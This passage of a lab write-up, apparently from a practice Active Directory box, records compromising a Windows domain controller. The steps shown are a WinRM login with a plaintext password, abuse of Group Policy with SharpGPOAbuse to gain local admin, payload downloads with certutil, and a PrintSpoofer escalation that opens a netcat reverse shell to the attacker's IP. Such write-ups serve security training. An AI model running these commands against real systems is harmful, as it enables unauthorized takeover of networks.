	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required
	|_clock-skew: mean: 24s, deviation: 1s, median: 23s
	| smb2-time: 
	|   date: 2024-10-04T21:12:37
	|_  start_date: 2024-09-27T21:51:05
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: dc01
	|   NetBIOS computer name: DC01\x00
	|   Domain name: secura.yzx                       # NOTE!
	|   Forest name: secura.yzx                       # NOTE!
	|   FQDN: dc01.secura.yzx                         # NOTE!
	|_  System time: 2024-10-04T21:12:38+00:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: required
```

## Foothold
```bash
evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"
```
## local.txt
```powershell
Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\Users\charlotte\Desktop
	
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----       10/25/2024  11:06 PM             34 local.txt
	*Evil-WinRM* PS C:\Users\TEMP\Documents> type C:\Users\charlotte\Desktop\local.txt
	f6754be5e8504176521ffe674fdf1691

```

## Enumeration
```powershell
whoami
	secura\charlotte
whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                               State
	============================= ========================================= =======
	SeMachineAccountPrivilege     Add workstations to domain                Enabled
	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

## WinPEAS
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\charlotte\Documents\SharpGPOAbuse.exe": charlotte [AllAccess]
```

## Elevating to Administrator - No idea if this is necessary
- With [SharpGPOAbuse.exe](https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7)
```powershell
certutil.exe -urlcache -f http://192.168.45.224:8080/PowerView.ps1 PowerView.ps1
Import-Module .\PowerView.ps1

# Get list of all GPOs
Get-NetGPO | select displayname
	displayname
	-----------
	Default Domain Policy
	Default Domain Controllers Policy


# Get ID
Get-GPO -Name "Default Domain Policy"
	DisplayName      : Default Domain Policy
	DomainName       : secura.yzx
	Owner            : SECURA\Domain Admins
	Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
	GpoStatus        : AllSettingsEnabled
	Description      :
	CreationTime     : 8/5/2022 6:20:58 PM
	ModificationTime : 10/25/2022 5:39:34 PM
	UserVersion      : AD Version: 3, SysVol Version: 3
	ComputerVersion  : AD Version: 70, SysVol Version: 70


# Check user's perms (NOTE: 'Edit')
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
	Trustee     : charlotte
	TrusteeType : User
	Permission  : GpoEditDeleteModifySecurity
	Inherited   : False


# Add user to Admin group
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
	[+] Domain = secura.yzx
	[+] Domain Controller = dc01.secura.yzx
	[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
	[+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
	[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
	[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
	[+] The GPO does not specify any group memberships.
	[+] versionNumber attribute changed successfully
	[+] The version number in GPT.ini was increased successfully.
	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
	[+] Done!


# Force update new policy settings
gpupdate /force
	Updating policy...
	Computer Policy update has completed successfully.
	User Policy update has completed successfully.


# Verify
net localgroup administrators
	Alias name     administrators
	Comment        Administrators have complete and unrestricted access to the computer/domain
	Members
	-------------------------------------------------------------------------------
	Administrator
	charlotte
	The command completed successfully.
```

## Elevating Privs
- As we have `SeImpersonatePrivilege`
```powershell
certutil.exe -urlcache -f http://192.168.45.224:8080/PrintSpooferx64.exe PrintSpooferx64.exe

# Didn't work
.\PrintSpooferx64.exe -i -c powershell
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
	[!] CreateProcessWithTokenW() isn't compatible with option -i

whoami
secura\charlotte

# Had to use a revshell
PS C:\users\charlotte> .\PrintSpoofer64.exe -c "nc.exe 192.168.45.224 9997 -e cmd.exe"
	[+] Found privilege: SeImpersonatePrivilege
	[+] Named pipe listening...
	[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
	[+] CreateProcessWithTokenW() OK

# In Kali's revshell 9997
rlwrap nc -nlvp 9997
	listening on [any] 9997 ...
	connect to [192.168.45.224] from (UNKNOWN) [192.168.224.97] 51774
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
	whoami
	secura\dc01$

C:\Windows\system32> type C:\users\administrator.dc01\desktop\proof.txt
	736f8124f726f6af42e79af1170faa4c
```